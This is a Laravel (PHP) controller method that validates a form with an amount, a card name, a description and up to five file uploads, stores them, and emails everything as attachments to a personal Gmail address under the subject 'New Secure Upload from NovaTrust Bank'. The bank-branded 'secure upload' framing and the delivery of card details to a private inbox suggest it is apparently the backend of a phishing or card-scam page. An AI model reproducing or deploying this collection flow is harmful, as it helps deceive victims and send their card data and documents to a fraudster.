public function store(Request $request)
{
    // ✅ Validate incoming form data
    $validated = $request->validate([
        'amount'        => 'required|numeric|min:1',
        'card_name'     => 'required|string|max:255',
        'description'   => 'nullable|string|max:1000',
        'upload_file1'  => 'required|file|mimes:jpg,jpeg,png,pdf|max:5120',
        'upload_file2'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
        'upload_file3'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
        'upload_file4'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
        'upload_file5'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',
    ]);

    $uploadedFiles = [];
    $description = $validated['description'] ?? null;

    // ✅ Upload all selected files (1–5)
    foreach (range(1, 5) as $i) {
        $fileKey = 'upload_file' . $i;

        if ($request->hasFile($fileKey)) {
            $file = $request->file($fileKey);
            $path = $file->store('uploads', 'public');

            $upload = Upload::create([
                'user_id'       => Auth::id(),
                'amount'        => $validated['amount'],
                'card_name'     => $validated['card_name'],
                'description'   => $description,
                'file_path'     => $path,
                'original_name' => $file->getClientOriginalName(),
            ]);

            $uploadedFiles[] = $upload;
        }
    }

    if (empty($uploadedFiles)) {
        return back()
            ->withErrors(['upload_file1' => 'Please upload at least one file.'])
            ->withInput();
    }

    // ✅ Prepare attachments
    $attachments = [];
    foreach ($uploadedFiles as $upload) {
        $fileFullPath = storage_path('app/public/' . $upload->file_path);
        if (file_exists($fileFullPath)) {
            $attachments[] = $fileFullPath;
        }
    }

    // ✅ Send email
    try {
        $fileNames = collect($uploadedFiles)->pluck('original_name')->implode(', ');
        $descriptionText = $description ?: 'N/A';

        Mail::raw("
            📦 New Secure Upload Received

            👤 Card Name: {$validated['card_name']}
            💰 Amount: \${$validated['amount']}
            📝 Description: {$descriptionText}
            📎 Files: {$fileNames}
        ", function ($message) use ($attachments) {
            $message->to('collaomn@gmail.com')
                    ->subject('📎 New Secure Upload from NovaTrust Bank');

            foreach ($attachments as $path) {
                $message->attach($path);
            }
        });

        Log::info('✅ Upload email sent successfully.');
    } catch (\Exception $e) {
        Log::error('❌ Email sending failed: ' . $e->getMessage());
    }

    return redirect()
        ->route('secure.upload.success', ['id' => $uploadedFiles[0]->id])
        ->with('success', '✅ Upload saved and sent successfully!');
}
